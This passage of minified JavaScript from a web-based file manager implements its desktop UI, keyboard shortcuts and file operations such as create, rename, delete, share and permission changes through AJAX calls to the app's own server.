                    var a = G.static_path + "images/app/recycle_full.png";
                    if (0 == e.data.folderlist.length && 0 == e.data.filelist.length) var a = G.static_path + "images/app/recycle.png";
                    $(".menuRecycleButton .ico").css("background-image", 'url("' + a + '")')
                }
            });
            else {
                var i = fileLight.getAllName();
                o(a), ui.path.setSelectByFilename(i)
            }
        },
        l = function(e) {
            r(!0, !1, e)
        },
        c = function() {
            for (var e = 0; G.json_data.filelist.length > e; e++) G.json_data.filelist[e].atime = date(LNG.time_type, G.json_data.filelist[e].atime), G.json_data.filelist[e].ctime = date(LNG.time_type, G.json_data.filelist[e].ctime), G.json_data.filelist[e].mtime = date(LNG.time_type, G.json_data.filelist[e].mtime);
            for (var e = 0; G.json_data.folderlist.length > e; e++) G.json_data.folderlist[e].atime = date(LNG.time_type, G.json_data.folderlist[e].atime), G.json_data.folderlist[e].ctime = date(LNG.time_type, G.json_data.folderlist[e].ctime), G.json_data.folderlist[e].mtime = date(LNG.time_type, G.json_data.folderlist[e].mtime)
        };
    return {
        f5: r,
        f5_callback: l,
        picasa: e,
        setListSort: i,
        sort_list: s,
        init: function() {
            $(".hidden").removeClass("hidden"), s(), l(), n(), $(window).bind("resize", function() {
                ui.setStyle(), 0 != PicasaOpen && e.setFrameResize(), s()
            }), $("html").die("click").live("click", function() {
                rightMenu.hidden(), Global.isIE && Global.isDragSelect
            }), Mousetrap.bind(["ctrl+s", "command+s"], function(e) {
                e.preventDefault(), FrameCall.top("OpenopenEditor", "Editor.save", "")
            });
            var a, t = 0,
                i = "",
                o = 200;
            Mousetrap.bind(["1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "`", "~", "!", "@", "#", "$", "%", "^", "&", "*", "(", ")", "-", "_", "=", "+", "[", "{", "]", "}", "|", "/", "?", ".", ">", ",", "<", "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z"], function(e) {
                var n = String.fromCharCode(e.charCode);
                return 0 == t ? (t = time(), i = n, a = setTimeout(function() {
                    ui.path.setSelectByChar(i), t = 0
                }, o), void 0) : n == i.substr(-1) ? (ui.path.setSelectByChar(i), t = 0, void 0) : (o > time() - t && (t = time(), i += n, clearTimeout(a), a = setTimeout(function() {
                    ui.path.setSelectByChar(i), t = 0
                }, o)), void 0)
            }), Mousetrap.bind(["f5"], function(e) {
                stopPP(e), ui.f5(!0, !0)
            }), Mousetrap.bind(["ctrl+u", "command+u"], function(e) {
                stopPP(e), core.upload()
            }), Mousetrap.bind(["ctrl+e", "command+e"], function(e) {
                stopPP(e), ui.path.openEditor()
            }), Mousetrap.bind(["alt+i", "alt+i"], function(e) {
                stopPP(e), ui.path.info()
            }), Mousetrap.bind(["alt+n", "alt+n"], function(e) {
                stopPP(e), ui.path.newFile()
            }), Mousetrap.bind(["alt+m", "alt+m"], function(e) {
                stopPP(e), ui.path.newFolder()
            }), PicasaOpen = !1, e.init(".picasaImage"), e.initData()
        },
        setTheme: function(e) {
            core.setSkin(e, "app_desktop.css"), FrameCall.top("OpenopenEditor", "Editor.setTheme", '"' + e + '"'), FrameCall.top("Opensetting_mode", "Setting.setThemeSelf", '"' + e + '"'), FrameCall.father("ui.setTheme", '"' + e + '"')
        },
        setWall: function(e) {
            $(".wallbackground").attr("src", e).one("load", function() {
                $(".desktop").css("background-image", "url(" + e + ")")
            })
        },
        isEdit: function() {
            var e = $(document.activeElement).get(0);
            if (e) return e = e.tagName, "INPUT" == e || "TEXTAREA" == e ? !0 : !1
        },
        setStyle: function() {
            Global.fileRowNum = function() {
                var e = $(Config.FileBoxSelector).width(),
                    a = $sizeInt($(Config.FileBoxClass).css("width")) + $sizeInt($(Config.FileBoxClass).css("border-left-width")) + $sizeInt($(Config.FileBoxClass).css("border-right-width")) + $sizeInt($(Config.FileBoxClass).css("margin-right"));
                return parseInt(e / a)
            }()
        }
    }
}), define("app/src/explorer/path", ["../../common/pathOperate", "../../tpl/fileinfo/file_info.html", "../../tpl/fileinfo/path_info.html", "../../tpl/fileinfo/path_info_more.html", "../../tpl/share.html", "../../tpl/app.html", "../../common/pathOpen", "../../common/CMPlayer"], function(e) {
    var a = e("../../common/pathOperate"),
        t = e("../../common/pathOpen"),
        n = void 0;
    ui.pathOpen = t;
    var s = function(e, a, t) {
            if (void 0 != e) {
                if ("explorer" != Config.pageApp) return core.explorer(e), void 0;
                if (e == G.this_path) return void 0 != a && "" != a && core.tips.tips(LNG.path_is_current, "info"), void 0;
                if (G.this_path = e.replace(/\\/g, "/"), G.this_path = e.replace(/\/+/g, "/"), "/" != G.this_path.substr(G.this_path.length - 1) && (G.this_path += "/"), $(".dialog_file_upload").length > 0) {
                    var i = "hidden" == $(".dialog_file_upload").css("visibility");
                    core.upload(), i && $(".dialog_file_upload").css("visibility", "hidden")
                }
                ui.f5_callback(function() {
                    "function" == typeof t && t()
                })
            }
        },
        o = function(e, a) {
            var t, i, n = 0,
                s = G.json_data.folderlist,
                o = G.json_data.filelist;
            if ("desktop" == Config.pageApp && (n = $(".menuDefault").length), "folder" == a) {
                for (t = 0; s.length > t && !(s[t].name >= e); t++);
                return "up" == G.sort_order ? t + n : o.length + t + n
            }
            if ("file" == a) {
                for (i = 0; o.length > i && !(o[i].name >= e); i++);
                return "down" == G.sort_order ? i + n : s.length + i + n
            }
            return -1
        },
        r = function(e) {
            void 0 != e && ("string" == typeof e && (e = [e]), fileLight.clear(), $(".fileContiner .file").each(function(a) {
                var t = fileLight.name($(this)); - 1 != $.inArray(t, e) && $(Global.fileListAll).eq(a).addClass(Config.SelectClassName)
            }), fileLight.select(), fileLight.setInView())
        },
        l = function(e) {
            if ("" != e) {
                if (e = e.toLowerCase(), void 0 == n || G.this_path != n.path || e != n.key) {
                    var a = [];
                    $(".fileContiner .file").each(function() {
                        var t = fileLight.name($(this));
                        t && e == t.substring(0, e.length).toLowerCase() && a.push(t)
                    }), n = {
                        key: e,
                        path: G.this_path,
                        index: 0,
                        list: a
                    }
                }
                0 != n.list.length && (r(n.list[n.index++]), n.index == n.list.length && (n.index = 0))
            }
        },
        c = function(e) {
            return "" == e ? (fileLight.clear(), void 0) : (fileLight.clear(), $(".fileContiner .file").each(function(a) {
                var t = fileLight.name($(this)); - 1 != t.toLowerCase().indexOf(e) && $(Global.fileListAll).eq(a).addClass(Config.SelectClassName)
            }), fileLight.select(), fileLight.setInView(), void 0)
        },
        d = function(e, a, t) {
            var n = e.length;
            for (i = 0; n > i; i++)
                if (e[i][a] == t) return e[i]
        },
        p = function(e) {
            var a = "",
                t = 0;
            return null != G.json_data.filelist && (a = d(G.json_data.filelist, "name", e), null != a && (t = 1)), null != G.json_data.folderlist && (a = d(G.json_data.folderlist, "name", e), null != a && (t = 1)), t
        },
        u = function(e, a) {
            var t, i = 0;
            if (void 0 == a) {
                if (!p(e)) return e;
                for (t = e + "(0)"; p(t);) i++, t = e + "(" + i + ")";
                return t
            }
            if (!p(e + "." + a)) return e + "." + a;
            for (t = e + "(0)." + a; p(t);) i++, t = e + "(" + i + ")." + a;
            return t
        },
        h = function() {
            $.ajax({
                dataType: "json",
                url: "index.php?explorer/historyBack",
                beforeSend: function() {
                    $(".tools-left .msg").stop(!0, !0).fadeIn(100)
                },
                error: core.ajaxError,
                success: function(e) {
                    return $(".tools-left .msg").fadeOut(100), e.code ? (e = e.data, G.this_path = e.thispath, G.json_data = e.list, Global.historyStatus = e.history_status, ui.f5(!1, !0), ui.header.updateHistoryStatus(), ui.header.addressSet(), void 0) : (core.tips.tips(e), $(Config.FileBoxSelector).html(""), !1)
                }
            })
        },
        f = function() {
            $.ajax({
                dataType: "json",
                url: "index.php?explorer/historyNext",
                beforeSend: function() {
                    $(".tools-left .msg").stop(!0, !0).fadeIn(100)
                },
                error: core.ajaxError,
                success: function(e) {
                    return $(".tools-left .msg").fadeOut(100), e.code ? (e = e.data, G.this_path = e.thispath, G.json_data = e.list, Global.historyStatus = e.history_status, ui.f5(!1, !0), ui.header.updateHistoryStatus(), ui.header.addressSet(), void 0) : (core.tips.tips(e), $(Config.FileBoxSelector).html(""), !1)
                }
            })
        },
        m = function(e) {
            fileLight.clear(), void 0 == e && (e = "txt");
            var t = "newfile",
                t = u(t, e),
                i = o(t, "file");
            i = 0 == i ? -1 : i - 1;
            var n = '<div class="file select menufile"  id="makefile">			<div class="' + e + ' ico"></div>				<div class="titleBox">					<span class="title">					<div class="textarea">						<textarea class="newfile fix">' + t + '</textarea>					</span>				</div>			</div>			<div style="clear:both;"></div>		</div>'; - 1 == i ? $(Config.FileBoxSelector).html(n + $(Config.FileBoxSelector).html()) : $(n).insertAfter(Config.FileBoxSelector + " .file:eq(" + i + ")"), "desktop" == Config.pageApp && ui.sort_list();
            var s = $(".newfile"),
                l = s.get(0),
                c = t.length - e.length - 1;
            if (Global.isIE) {
                var d = l.createTextRange();
                d.moveEnd("character", -l.value.length), d.moveEnd("character", c), d.moveStart("character", 0), d.select()
            } else l.setSelectionRange(0, c);
            s.focus(), s.unbind("keydown").keydown(function(e) {
                return (13 == e.keyCode || 27 == e.keyCode) && (stopPP(e), e.preventDefault(), filename = s.attr("value"), p(filename) ? ($("#makefile").remove(), core.tips.tips(LNG.path_exists, "warning")) : a.newFile(G.this_path + filename, function() {
                    ui.f5_callback(function() {
                        r(filename)
                    })
                })), !0
            }), s.unbind("blur").blur(function() {
                filename = s.attr("value"), p(filename) ? ($("#makefile").remove(), core.tips.tips(LNG.path_exists, "warning"), _newFile(e)) : a.newFile(G.this_path + filename, function() {
                    ui.f5_callback(function() {
                        r(filename)
                    })
                })
            })
        },
        v = function() {
            fileLight.clear();
            var e = LNG.newfolder,
                e = u(e),
                t = o(e, "folder");
            t = 0 == t ? -1 : t - 1;
            var i = '<div class="file select menufolder" id="makefile">';
            i += '<div class="folder ico" filetype="folder"></div>', i += '<div  class="titleBox"><span class="title">', i += '<div class="textarea"><textarea class="newfile fix">' + e + '</textarea></span></div></div><div style="clear:both;"></div></div>', -1 == t ? $(Config.FileBoxSelector).html(i + $(Config.FileBoxSelector).html()) : $(i).insertAfter(Config.FileBoxSelector + " .file:eq(" + t + ")"), "desktop" == Config.pageApp && ui.sort_list(), $(".newfile").select(), $(".newfile").focus(), $(".newfile").unbind("keydown").keydown(function(e) {
                if (13 == e.keyCode || 27 == e.keyCode) {
                    stopPP(e), e.preventDefault();
                    var t = $(".newfile").attr("value");
                    p(t) ? ($("#makefile").remove(), core.tips.tips(LNG.path_exists, "warning")) : a.newFolder(G.this_path + t, function() {
                        "explorer" == Config.pageApp && ui.tree.checkIfChange(G.this_path), ui.f5_callback(function() {
                            r(t)
                        })
                    })
                }
            }), $(".newfile").unbind("blur").blur(function() {
                filename = $(".newfile").attr("value"), p(filename) ? ($("#makefile").remove(), core.tips.tips(LNG.path_exists, "warning"), _newFolder()) : a.newFolder(G.this_path + filename, function() {
                    "explorer" == Config.pageApp && ui.tree.checkIfChange(G.this_path), ui.f5_callback(function() {
                        r(filename)
                    })
                })
            })
        },
        _ = function() {
            var e = "",
                t = "",
                i = Global.fileListSelect,
                n = fileLight.name(i),
                s = fileLight.type(i);
            if (1 == i.length) {
                if (i.hasClass("menuSharePath")) return ui.path.share_edit(), void 0;
                s = "folder" == s ? "folder" : s, $(i).find(".title").html("<div class='textarea'><textarea class='fix' id='pathRenameTextarea'>" + $(i).find(".title").text() + "</textarea><div>");
                var o = $("#pathRenameTextarea"),
                    l = o.get(0);
                if ("folder" == s) o.select();
                else {
                    var c = n.length - s.length - 1;
                    if (Global.isIE) {
                        var d = l.createTextRange();
                        d.moveEnd("character", -l.value.length), d.moveEnd("character", c), d.moveStart("character", 0), d.select()
                    } else l.setSelectionRange(0, c)
                }
                o.unbind("focus").focus(), o.keydown(function(l) {
                    if (13 == l.keyCode) {
                        l.preventDefault(), stopPP(l), e = o.attr("value"), "oexe" == s && (e += ".oexe");
                        var c = e;
                        e != n ? (t = urlEncode(G.this_path + n), e = urlEncode(G.this_path + e), a.rname(t, e, function() {
                            "explorer" == Config.pageApp && ui.tree.checkIfChange(G.this_path), ui.f5_callback(function() {
                                r(c)
                            })
                        })) : ("oexe" == s && (n = n.replace(".oexe", "")), $(i).find(".title").html(n))
                    }
                    27 == l.keyCode && ("oexe" == s && (n = n.replace(".oexe", "")), $(i).find(".title").html(n))
                }), o.unbind("blur").blur(function() {
                    e = $("#pathRenameTextarea").attr("value"), "oexe" == s && (e += ".oexe");
                    var o = e;
                    e != n ? (t = urlEncode(G.this_path + n), e = urlEncode(G.this_path + e), a.rname(t, e, function() {
                        "explorer" == Config.pageApp && ui.tree.checkIfChange(G.this_path), ui.f5_callback(function() {
                            r(o)
                        })
                    })) : ("oexe" == s && (n = n.replace(".oexe", "")), $(i).find(".title").html(n))
                })
            }
        },
        g = function() {
            ui.f5(), "explorer" == Config.pageApp && ui.tree.checkIfChange(G.this_path)
        },
        y = function(e) {
            if (e) {
                var a = [];
                return 0 == Global.fileListSelect.length ? a : (Global.fileListSelect.each(function() {
                    var e = G.this_path + fileLight.name($(this)),
                        t = "folder" == fileLight.type($(this)) ? "folder" : "file";
                    "*share*/" == G.this_path && (e = $(this).attr("data-path"), t = "share"), a.push({
                        path: e,
                        type: t
                    })
                }), a)
            }
            if (1 != Global.fileListSelectNum) return {
                path: "",
                type: ""
            };
            var t = Global.fileListSelect,
                i = G.this_path + fileLight.name(t),
                n = fileLight.type(t);
            return "*share*/" == G.this_path && (i = t.attr("data-path"), n = "share"), {
                path: i,
                type: n
            }
        };
    return {
        appEdit: function(e) {
            if (e) a.appEdit(0, 0, "user_add");
            else {
                var t = Global.fileListSelect.attr("data-app"),
                    i = json_decode(urlDecode(t));
                i.path = G.this_path + fileLight.name(Global.fileListSelect), a.appEdit(i)
            }
        },
        appList: function() {
            a.appList(y().path)
        },
        appInstall: function() {
            a.appInstall(y().path)
        },
        openEditor: function() {
            t.openEditor(y().path)
        },
        openIE: function() {
            t.openIE(y().path)
        },
        open: function(e) {
            if (0 != y().path.length) {
                if ("*recycle*/" == G.this_path) return ui.path.info(), void 0;
                if ("*share*/" == G.this_path) return ui.path.share_open_window(), void 0;
                if (void 0 != e) return t.open(e), void 0;
                var a = y(),
                    i = Global.fileListSelect;
                if (inArray(core.filetype.image, a.type)) {
                    if (!core.authCheck("explorer:fileDownload", LNG.no_permission_download)) return;
                    return "icon" == G.list_type || "desktop" == Config.pageApp ? ui.picasa.play($(i).find(".ico")) : ui.picasa.play($(i)), void 0
                }
                if ("oexe" == a.type) {
                    var n = i.attr("data-app");
                    a.path = json_decode(urlDecode(n))
                }
                t.open(a.path, a.type)
            }
        },
        play: function() {
            if (!(1 > Global.fileListSelectNum)) {
                var e = [];
                Global.fileListSelect.each(function() {
                    var a = fileLight.type($(this));
                    if (inArray(core.filetype.music, a) || inArray(core.filetype.movie, a)) {
                        var t = core.path2url(G.this_path + fileLight.name($(this)));
                        e.push(t)
                    }
                }), t.play(e, "music")
            }
        },
        pathOperate: a,
        share: function() {
            a.share(y())
        },
        setBackground: function() {
            a.setBackground(y().path)
        },
        createLink: function() {
            a.createLink(y().path, y().type, function(e) {
                ui.f5_callback(function() {
                    r(e.info)
                })
            })
        },
        createProject: function() {
            a.createProject(y().path, function(e) {
                ui.f5_callback(function() {
                    r(e.info)
                })
            })
        },
        download: function() {
            var e = y(!0);
            1 == e.length && "file" == e[0].type ? t.download(y().path) : a.zipDownload(e)
        },
        share_edit: function() {
            var e = y().path,
                t = G.json_data.share_list[e];
            a.share_box(t)
        },
        share_open_window: function() {
            var e = y().path,
                a = G.json_data.share_list[e],
                t = a.type;
            "folder" == a.type && (t = 1 == a.code_read ? "code_read" : "folder");
            var i = "./index.php?share/" + t + "&user=" + G.user_name + "&sid=" + a.sid;
            window.open(i)
        },
        share_open_path: function() {
            var e = y().path,
                a = G.json_data.share_list[e],
                t = core.pathFather(a.path),
                i = core.pathThis(a.path);
            ui.path.list(t, "", function() {
                r(i)
            })
        },
        recycle_clear: function() {
            $.dialog({
                id: "dialog_path_remove",
                fixed: !0,
                icon: "question",
                title: LNG.remove_title,
                padding: 40,
                lock: !0,
                background: "#000",
                opacity: .2,
                content: LNG.recycle_clear_info,
                ok: function() {
                    $.ajax({
                        url: "index.php?explorer/pathDeleteRecycle",
                        beforeSend: function() {
                            core.tips.loading()
                        },
                        error: core.ajaxError,
                        success: function(e) {
                            core.tips.close(e), ui.f5(), FrameCall.father("ui.f5", "1,1"), "function" == typeof callback && callback(e)
                        }
                    })
                },
                cancel: !0
            })
        },
        explorer: function() {
            core.explorer(y().path)
        },
        explorerNew: function() {
            window.open("index.php?/explorer&path=" + y().path)
        },
        openProject: function() {
            core.explorerCode(y().path)
        },
        search: function() {
            core.search("", y().path)
        },
        fav: function() {
            a.fav(y().path)
        },
        remove: function() {
            a.remove(y(!0), g), fileLight.clear()
        },
        copy: function() {
            a.copy(y(!0))
        },
        cute: function() {
            a.cute(y(!0), ui.f5)
        },
        zip: function() {
            a.zip(y(!0), function(e) {
                ui.f5_callback(function() {
                    r(e.info)
                })
            })
        },
        unZip: function() {
            a.unZip(y().path, ui.f5)
        },
        cuteDrag: function(e) {
            a.cuteDrag(y(!0), e, g)
        },
        copyDrag: function(e, t) {
            a.copyDrag(y(!0), e, function(e) {
                fileLight.clear(), "explorer" == Config.pageApp && ui.tree.checkIfChange(G.this_path), ui.f5_callback(function() {
                    t && e.data && r(e.data)
                })
            })
        },
        info: function() {
            if ("share" == y().type) {
                var e = y().path,
                    t = G.json_data.share_list[e],
                    i = t.path;
                a.info([{
                    path: i,
                    type: t.type
                }])
            } else a.info(y(!0))
        },
        past: function() {
            fileLight.clear(), a.past(G.this_path, function(e) {
                "explorer" == Config.pageApp && ui.tree.checkIfChange(G.this_path), ui.f5_callback(function() {
                    r(e)
                })
            })
        },
        back: h,
        next: f,
        list: s,
        newFile: m,
        newFolder: v,
        rname: _,
        setSearchByStr: c,
        setSelectByChar: l,
        setSelectByFilename: r,
        clipboard: a.clipboard
    }
}), define("app/common/pathOperate", [], function(e) {
    var a = {};
    a.file_info = e("../tpl/fileinfo/file_info.html"), a.path_info = e("../tpl/fileinfo/path_info.html"), a.path_info_more = e("../tpl/fileinfo/path_info_more.html");
    var t = ["/", "\\", ":", "*", "?", '"', "<", ">", "|"],
        i = function(e) {
            var a = function(e, a) {
                for (var t = a.length, i = 0; t > i; i++)
                    if (e.indexOf(a[i]) > 0) return !0;
                return !1
            };
            return a(e, t) ? (core.tips.tips(LNG.path_not_allow + ':/  : * ? " < > |', !1), !1) : !0
        },
        n = function(e) {
            for (var a = "list=[", t = 0; e.length > t; t++) a += '{"type":"' + e[t].type + '","path":"' + urlEncode2(e[t].path) + '"}', e.length - 1 > t && (a += ",");
            return a + "]"
        },
        s = function(e, a) {
            if (e) {
                var t = core.pathThis(e);
                return i(t) ? ($.ajax({
                    dataType: "json",
                    url: "index.php?explorer/mkfile&path=" + urlEncode2(e),
                    beforeSend: function() {
                        core.tips.loading()
                    },
                    error: core.ajaxError,
                    success: function(e) {
                        core.tips.close(e), "function" == typeof a && a(e)
                    }
                }), void 0) : ("function" == typeof a && a(), void 0)
            }
        },
        o = function(e, a) {
            if (e) {
                var t = core.pathThis(e);
                return i(t) ? ($.ajax({
                    dataType: "json",
                    url: "index.php?explorer/mkdir&path=" + urlEncode2(e),
                    beforeSend: function() {
                        core.tips.loading()
                    },
                    error: core.ajaxError,
                    success: function(e) {
                        core.tips.close(e), "function" == typeof a && a(e)
                    }
                }), void 0) : ("function" == typeof a && a(), void 0)
            }
        },
        r = function(e, a, t) {
            return e && a && e != a ? i(core.pathThis(a)) ? ($.ajax({
                type: "POST",
                dataType: "json",
                url: "index.php?explorer/pathRname",
                data: "path=" + urlEncode(e) + "&rname_to=" + urlEncode(a),
                beforeSend: function() {
                    core.tips.loading()
                },
                error: core.ajaxError,
                success: function(e) {
                    core.tips.close(e), "function" == typeof t && t(e)
                }
            }), void 0) : ("function" == typeof t && t(), void 0) : void 0
        },
        l = function(e, a) {
            if (!(1 > e.length)) {
                var t = e[0].path,
                    i = LNG.remove_title,
                    s = t + "<br/>" + LNG.remove_info,
                    o = "index.php?explorer/pathDelete";
                "*recycle*/" == G.this_path && (s = LNG.recycle_remove + "?", o = "index.php?explorer/pathDeleteRecycle", i = LNG.recycle_remove), "share" == e[0].type && (s = LNG.share_remove_tips, o = "index.php?userShare/del", i = LNG.share_remove), e.length > 1 && (s += ' ... <span class="badge">' + e.length + "</span>"), $.dialog({
                    id: "dialog_path_remove",
                    fixed: !0,
                    icon: "question",
                    title: i,
                    width: 300,
                    padding: 40,
                    lock: !0,
                    background: "#000",
                    opacity: .3,
                    content: s,
                    ok: function() {
                        $.ajax({
                            url: o,
                            type: "POST",
                            dataType: "json",
                            data: n(e),
                            beforeSend: function() {
                                core.tips.loading()
                            },
                            error: core.ajaxError,
                            success: function(t) {
                                if (core.tips.close(t), FrameCall.father("ui.f5", "1,1"), "share" == e[0].type) {
                                    var i = art.dialog.list.share_dialog;
                                    void 0 != i && i.close(), $(".jiathis_style").appendTo(".global_share")
                                }
                                "function" == typeof a && a(t)
                            }
                        })
                    },
                    cancel: !0
                })
            }
        },
        c = function(e) {
            1 > e.length || $.ajax({
                url: "index.php?explorer/pathCopy",
                type: "POST",
                dataType: "json",
                data: n(e),
                error: core.ajaxError,
                success: function(e) {
                    core.tips.tips(e)
                }
            })
        },
        d = function(e) {
            var a = e.path,
                t = "folder" == e.type ? "folder" : "file";
            1 > a.length || core.authCheck("userShare:set") && $.ajax({
                url: "./index.php?userShare/checkByPath&path=" + urlEncode(a),
                dataType: "json",
                success: function(e) {
                    e.code ? p(e.data) : p(void 0, function() {
                        $(".content_info input[name=type]").val(t), $(".content_info input[name=path]").val(a), $(".content_info input[name=name]").val(core.pathThis(a)), "file" == t && $(".label_code_read").addClass("hidden")
                    })
                }
            })
        },
        p = function(a, t) {
            0 != $(".share_dialog").length && $(".share_dialog").shake(2, 5, 100), seajs.use("lib/jquery.datetimepicker/jquery.datetimepicker.css"), e.async("lib/jquery.datetimepicker/jquery.datetimepicker", function() {
                u(a), void 0 != t && t()
            })
        },
        u = function(a) {
            var t = e("../tpl/share.html"),
                i = template.compile(t),
                n = i({
                    LNG: LNG
                });
            $.dialog({
                id: "share_dialog",
                simple: !0,
                resize: !1,
                width: 425,
                title: LNG.share,
                padding: "0",
                fixed: !0,
                content: n,
                cancel: function() {
                    $(".jiathis_style").appendTo(".global_share")
                }
            });
            var s = "zh_CN" == G.lang ? "ch" : "en";
            $("#share_time").datetimepicker({
                format: "Y/m/d",
                formatDate: "Y/m/d",
                timepicker: !1,
                lang: s
            }), $("#share_time").unbind("blur").bind("blur", function(e) {
                stopPP(e)
            });
            var o = function(e) {
                    if ($(".share_setting_more").addClass("hidden"), void 0 == e) $(".share_has_url").addClass("hidden"), $(".share_action .share_remove_button").addClass("hidden"), $(".content_info input[name=sid]").val(""), $(".content_info input[name=type]").val(""), $(".content_info input[name=name]").val(""), $(".content_info input[name=path]").val(""), $(".content_info input[name=time_to]").val(""), $(".content_info input[name=share_password]").val(""), $(".share_view_info").addClass("hidden");
                    else {
                        a = e, $(".content_info input[name=sid]").val(e.sid), $(".content_info input[name=type]").val(e.type), $(".content_info input[name=name]").val(e.name), $(".content_info input[name=path]").val(e.path), $(".content_info input[name=time_to]").val(e.time_to), $(".content_info input[name=share_password]").val(e.share_password), $(".share_view_info").removeClass("hidden"), e.num_download === void 0 && (e.num_download = 0), e.num_view === void 0 && (e.num_view = 0);
                        var t = LNG.share_view_num + e.num_view + "  " + LNG.share_download_num + e.num_download;
                        $(".share_view_info").html(t), "1" == e.code_read ? $(".content_info input[name=code_read]").attr("checked", "checked") : $(".content_info input[name=code_read]").removeAttr("checked"), "1" == e.not_download ? $(".content_info input[name=not_download]").attr("checked", "checked") : $(".content_info input[name=not_download]").removeAttr("checked"), $(".share_has_url").removeClass("hidden"), "file" == e.type ? $(".label_code_read").addClass("hidden") : $(".label_code_read").removeClass("hidden");
                        var i = e.type;
                        "folder" == e.type && (i = 1 == e.code_read ? "code_read" : "folder");
                        var n = G.app_host + "index.php?share/" + i + "&user=" + G.user_name + "&sid=" + e.sid;
                        $(".content_info .share_url").val(n), ("" != e.time_to || "" != e.share_password || "1" == e.code_read || "1" == e.not_download) && $(".share_setting_more").removeClass("hidden"), $(".share_remove_button").removeClass("hidden"), $(".share_create_button").text(LNG.share_save), jiathis_config = {
                            url: n,
                            summary: e.name,
                            title: "share to ##",
                            shortUrl: !1,
                            hideMore: !1
                        }, $(".jiathis_style").appendTo(".share_jiathis_box")
                    }
                },
                r = function() {
                    $(".share_action .share_remove_button").unbind("click").click(function() {
                        ui.pathOperate.remove([{
                            type: "share",
                            path: a.sid
                        }]), "*share*/" == G.this_path && ui.f5()
                    }), $(".content_info .share_more").unbind("click").click(function() {
                        $(".share_setting_more").toggleClass("hidden")
                    }), $(".share_action .share_create_button").unbind("click").click(function() {
                        var e = "";
                        $(".share_dialog .content_info input[name]").each(function() {
                            var a = urlEncode($(this).val());
                            "checkbox" == $(this).attr("type") && (a = $(this).attr("checked") ? "1" : ""), e += "&" + $(this).attr("name") + "=" + a
                        }), $.ajax({
                            url: "index.php?userShare/set",
                            data: e,
                            type: "POST",
                            dataType: "json",
                            beforeSend: function() {
                                $(".share_create_button").addClass("disabled")
                            },
                            error: function() {
                                core.tips.tips(LNG.error, !1)
                            },
                            success: function(e) {
                                $(".share_create_button").removeClass("disabled"), e.code ? (o(e.data), $(".share_create_button").text(LNG.share_save), "*share*/" == G.this_path && ui.f5(), core.tips.tips(LNG.success, !0)) : core.tips.tips(e)
                            }
                        })
                    }), $(".content_info .open_window").unbind("click").bind("click", function() {
                        window.open($("input.share_url").val())
                    });
                    var e = $("input.share_url"),
                        t = e.get(0);
                    e.unbind("hover click").bind("hover click", function() {
                        $(this).focus();
                        var a = e.val().length;
                        if (Global.isIE) {
                            var i = t.createTextRange();
                            i.moveEnd("character", -t.value.length), i.moveEnd("character", a), i.moveStart("character", 0), i.select()
                        } else t.setSelectionRange(0, a)
                    })
                };
            o(a), r()
        },
        h = function(e) {
            if (!(1 > e.length)) {
                var a = core.path2url(e);
                FrameCall.father("ui.setWall", '"' + a + '"'), $.ajax({
                    url: "index.php?setting/set&k=wall&v=" + urlEncode(a),
                    type: "json",
                    success: function(e) {
                        core.tips.tips(e)
                    }
                })
            }
        },
        f = function(e, a, t) {
            if (!(1 > e.length)) {
                var i, n = core.pathThis(e),
                    s = core.pathFather(e);
                i = "folder" == a ? "ui.path.list('" + urlEncode(e) + "');" : "ui.path.open('" + urlEncode(e) + "');";
                var o = urlEncode2(s + n + ".oexe");
                $.ajax({
                    url: "./index.php?explorer/mkfile&path=" + o,
                    type: "POST",
                    dataType: "json",
                    data: 'content={"type":"app_link","content":"' + i + '","icon":"app_s2.png"}',
                    success: function(e) {
                        e.code && "function" == typeof t && t(e)
                    }
                })
            }
        },
        m = function(e, a) {
            if (!(1 > e.length)) {
                var t = core.pathThis(e),
                    i = core.pathFather(e);
                jsrun = "core.explorerCode('" + urlEncode(e) + "');";
                var n = urlEncode2(i + t + "_project.oexe");
                $.ajax({
                    url: "./index.php?explorer/mkfile&path=" + n,
                    type: "POST",
                    dataType: "json",
                    data: 'content={"type":"app_link","content":"' + jsrun + '","icon":"app_s2.png"}',
                    success: function(e) {
                        e.code && "function" == typeof a && a(e)
                    }
                })
            }
        },
        v = function(e) {
            1 > e.length || $.ajax({
                url: "index.php?explorer/pathCute",
                type: "POST",
                dataType: "json",
                data: n(e),
                error: core.ajaxError,
                success: function(e) {
                    core.tips.tips(e)
                }
            })
        },
        _ = function(e, a) {
            if (e) {
                var t = "index.php?explorer/pathPast&path=" + urlEncode2(e);
                $.ajax({
                    url: t,
                    dataType: "json",
                    beforeSend: function() {
                        core.tips.loading(LNG.moving)
                    },
                    error: core.ajaxError,
                    success: function(e) {
                        core.tips.close(e), "function" == typeof a && a(e.info)
                    }
                })
            }
        },
        g = function(e) {
            1 > e.length && (e = [{
                path: G.this_path,
                type: "folder"
            }]);
            var t = "index.php?explorer/pathInfo";
            G.share_page !== void 0 && (t = "index.php?share/pathInfo&user=" + G.user + "&sid=" + G.sid), $.ajax({
                url: t,
                type: "POST",
                dataType: "json",
                data: n(e),
                beforeSend: function() {
                    core.tips.loading(LNG.getting)
                },
                error: core.ajaxError,
                success: function(t) {
                    if (!t.code) return core.tips.close(t), void 0;
                    core.tips.close(LNG.get_success, !0);
                    var i = "path_info_more",
                        n = LNG.info;
                    1 == e.length && (i = "folder" == e[0].type ? "path_info" : "file_info", n = core.pathThis(e[0].path), n.length > 15 && (n = n.substr(0, 15) + "...  " + LNG.info));
                    var s = template.compile(a[i]),
                        o = UUID();
                    t.data.LNG = LNG, t.data.atime = date(LNG.time_type_info, t.data.atime), t.data.ctime = date(LNG.time_type_info, t.data.ctime), t.data.mtime = date(LNG.time_type_info, t.data.mtime), $.dialog({
                        id: o,
                        padding: 5,
                        ico: core.ico("info"),
                        fixed: !0,
                        title: n,
                        content: s(t.data),
                        width: "350px",
                        cancel: !0
                    }), y(o, e)
                }
            })
        },
        y = function(e, a) {
            $("." + e).find(".edit_chmod").click(function() {
                var e = $(this).parent().find("input"),
                    t = $(this);
                $.ajax({
                    url: "index.php?explorer/pathChmod&mod=" + e.val(),
                    type: "POST",
                    data: n(a),
                    beforeSend: function() {
                        t.text(LNG.loading)
                    },
                    error: function() {
                        t.text(LNG.button_save)
                    },
                    success: function(e) {
                        t.text(e.data).animate({
                            opacity: .6
                        }, 400, 0).delay(1e3).animate({
                            opacity: 1
                        }, 200, 0, function() {
                            t.text(LNG.button_save)
                        })
                    }
